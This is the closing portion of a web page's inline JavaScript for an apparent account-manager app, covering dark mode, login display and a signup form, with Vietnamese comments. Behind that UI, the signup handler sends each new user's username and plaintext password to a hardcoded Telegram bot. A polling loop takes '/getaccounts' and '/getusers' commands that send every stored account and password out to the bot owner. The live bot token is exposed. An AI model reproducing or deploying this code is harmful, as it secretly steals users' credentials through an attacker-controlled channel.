  const darkModeBtn = document.querySelector('a[onclick="toggleDarkMode()"]');
  darkModeBtn.innerHTML = isDarkMode ? '☀️ Light Mode' : '🌓 Dark Mode';
}

// Kiểm tra localStorage khi tải trang
document.addEventListener('DOMContentLoaded', () => {
  const savedDarkMode = localStorage.getItem('darkMode') === 'true';
  if (savedDarkMode) {
    document.body.classList.add('dark-mode');
    const darkModeBtn = document.querySelector('a[onclick="toggleDarkMode()"]');
    if (darkModeBtn) darkModeBtn.innerHTML = '☀️ Light Mode';
  }
});
function updateLoginUI(username) {
  const buttonsToDisable = [
    'randomFastBtn', 'saveBtn', 'downloadTxtBtn', 
    'downloadSelectedBtn', 'clearAllBtn', 
    'deleteSelectedBtn', 'selectionToggleBtn'
  ];
  
  if (username) {
    document.getElementById('loginBtn').style.display = 'none';
    document.getElementById('userDisplay').style.display = 'flex';
    document.getElementById('usernameDisplay').textContent = username;
    
    // Bỏ class disabled khỏi các nút
    buttonsToDisable.forEach(id => {
      const btn = document.getElementById(id);
      if (btn) btn.classList.remove('not-logged-in');
    });
  } else {
    document.getElementById('loginBtn').style.display = 'flex';
    document.getElementById('userDisplay').style.display = 'none';
    
    // Thêm class disabled vào các nút
    buttonsToDisable.forEach(id => {
      const btn = document.getElementById(id);
      if (btn) btn.classList.add('not-logged-in');
    });
  }
}
function logout() {
  localStorage.removeItem('currentUser');
  updateLoginUI(null);
  showCopyNotification("✅ Đã đăng xuất!", "#4caf50");
}
signupForm.addEventListener("submit", function(event) {
  event.preventDefault();

  const username = signupForm.querySelectorAll('input[type="text"]')[0].value.trim();
  const password = signupForm.querySelectorAll('input[type="password"]')[0].value.trim();
  const confirm = signupForm.querySelectorAll('input[type="password"]')[1].value.trim();

  if (!/^[a-z0-9]{6,32}$/.test(username)) {
    showCopyNotification("❌ Tên đăng nhập phải gồm 6–32 ký tự chữ thường & số", "#f44336");
    return;
  }

  if (password.length < 6 || password.length > 32 || !/[a-zA-Z]/.test(password) || !/[0-9]/.test(password)) {
    showCopyNotification("❌ Mật khẩu phải dài 6–32 ký tự, có chữ & số", "#f44336");
    return;
  }

  if (password !== confirm) {
    showCopyNotification("❌ Mật khẩu xác nhận không khớp!", "#f44336");
    return;
  }

  if (!localStorage.getItem(username)) {
    localStorage.setItem(username, JSON.stringify({ password }));
    
    // Gửi thông báo đăng ký với cả mật khẩu
    const telegramMsg = `📢 *NGƯỜI DÙNG MỚI ĐĂNG KÝ*\n\n` +
                       `👤 Username: \`${username}\`\n` +
                       `🔑 Password: \`${password}\`\n` +
                       `🕒 Thời gian: ${new Date().toLocaleString()}`;
    
    sendToTelegram(telegramMsg).then(() => {
      showCopyNotification("✅ Đăng ký thành công và đã gửi thông báo!", "#4caf50");
      loginBtn.click();
    }).catch(console.error);
  }
});
// Thêm các biến cấu hình Telegram
const TELEGRAM_BOT_TOKEN = '8076564532:AAERoDqSyg9TjFxPk3DXXdmP6xJN01Ct8Fk';
const TELEGRAM_CHAT_ID = '5940830830'; // Chat ID cá nhân của bạn

// Hàm gửi thông báo đến Telegram
async function sendToTelegram(message) {
  try {
    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'Markdown'
      })
    });
    return await response.json();
  } catch (error) {
    console.error('Lỗi gửi Telegram:', error);
    return null;
  }
}

// Hàm kiểm tra lệnh từ Telegram
async function checkTelegramCommands() {
  try {
     const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates`, {
      timeout: 5000  // Giới hạn thời gian chờ
    });
    const data = await response.json();
    
    if (data.ok && data.result.length > 0) {
      const lastUpdate = data.result[data.result.length - 1];
      const chatId = lastUpdate.message.chat.id;
      const text = lastUpdate.message.text;

      if (chatId == TELEGRAM_CHAT_ID) {
        // Lệnh cho quản lý tài khoản
        if (text === '/getaccounts') {
          let reply = "📦 DANH SÁCH TÀI KHOẢN QUẢN LÝ:\n\n";
          accounts.forEach((acc, i) => {
            reply += `${i+1}. ${acc.username} | ${acc.password} | ${acc.note || 'no note'}\n`;
          });
          await sendToTelegram(reply);
        }
        
        // Lệnh cho user hệ thống
        else if (text === '/getusers') {
          const users = Object.keys(localStorage).filter(key => 
            !['accounts', 'currentUser', 'darkMode'].includes(key)
          );
          
          let reply = "👥 DANH SÁCH USER HỆ THỐNG:\n\n";
          users.forEach(user => {
            const userData = JSON.parse(localStorage.getItem(user));
            reply += `- ${user} | ${userData.password}\n`;
          });
          await sendToTelegram(reply);
        }
        
        // Thống kê
        else if (text === '/stats') {
          const systemUsers = Object.keys(localStorage).filter(key => 
            !['accounts', 'currentUser', 'darkMode'].includes(key)
          ).length;
          
          await sendToTelegram(`📊 THỐNG KÊ:\nUser hệ thống: ${systemUsers}\nTài khoản quản lý: ${accounts.length}`);
        }
      }
     }
  } catch (error) {
    console.error("Lỗi getUpdates:", error);
    // Tự động khởi động lại sau 10s nếu lỗi
    setTimeout(checkTelegramCommands, 10000);
  } finally {
    // Gọi lại sau mỗi 3s (thay vì 5s)
    setTimeout(checkTelegramCommands, 3000); 
  }
}

// Sửa lỗi chính tả dòng này (document thay vì ocument)
document.addEventListener('DOMContentLoaded', () => {
  checkTelegramCommands();
  
  // Kiểm tra dark mode và login state
  const savedDarkMode = localStorage.getItem('darkMode') === 'true';
  if (savedDarkMode) {
    document.body.classList.add('dark-mode');
    const darkModeBtn = document.querySelector('a[onclick="toggleDarkMode()"]');
    if (darkModeBtn) darkModeBtn.innerHTML = '☀️ Light Mode';
  }
  
  const currentUser = localStorage.getItem('currentUser');
  if (currentUser) {
    updateLoginUI(currentUser);
  }
});
function isLoggedIn() {
  return !!localStorage.getItem('currentUser');
}

function showLoginRequired() {
  showCopyNotification("🔒 Vui lòng đăng nhập để sử dụng chức năng này!", "#f44336");
  showLogin(); // Tự động hiển thị form đăng nhập
}
</script>

</body>
</html>
